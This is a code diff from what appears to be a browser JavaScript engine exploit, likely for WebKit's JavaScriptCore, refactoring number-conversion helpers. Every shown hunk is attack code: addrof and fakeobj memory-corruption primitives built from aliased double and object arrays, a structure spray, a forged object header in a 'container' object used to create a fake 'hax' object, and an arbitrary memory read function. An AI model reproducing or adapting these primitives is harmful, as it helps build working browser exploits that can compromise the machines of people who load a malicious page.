@@ -498,10 +498,10 @@ for (var i = 0; i < 1000; ++i) {
         // temporary implementations
         addrof = (val) => {
           b1[0] = val;
-          return new Int64.fromDouble(a1[offset]);
+          return floatAsQword(a1[offset]);
         }
         fakeobj = (addr) => {
-          a1[offset] = new Int64(addr).asDouble();
+          a1[offset] = qwordAsFloat(addr);
           return b1[0];
         }
         var victim1 = structure_spray[510];
@@ -511,8 +511,8 @@ for (var i = 0; i < 1000; ++i) {
         var print = (msg) => {
           port.postMessage(msg);
         }
-        print("unboxed @ " + addrof(unboxed1));
-        print("boxed @ " + addrof(boxed1));
+        print("unboxed @ " + new Int64(addrof(unboxed1)));
+        print("boxed @ " + new Int64(addrof(boxed1)));
 
     var container = {
         header: qwordAsTagged(0x0108230900000000), // cell
@@ -522,7 +522,7 @@ for (var i = 0; i < 1000; ++i) {
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
-    print("outer @ " + addrof(container));
+    print("outer @ " + new Int64(addrof(container)));
 
     var hax = fakeobj(Add(addrof(container),new Int64("0x10")));
     print("we have hax object ;)");
@@ -574,7 +574,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         readInt64: function(where) {
             if (where instanceof Int64) {
-                where = Add(where, new Int64("0x10"));
+                where = Add(where, 0x10);
 		hax[1] = where.asDouble();
 	    } else {
 		hax[1] = qwordAsFloat(where + 0x10);
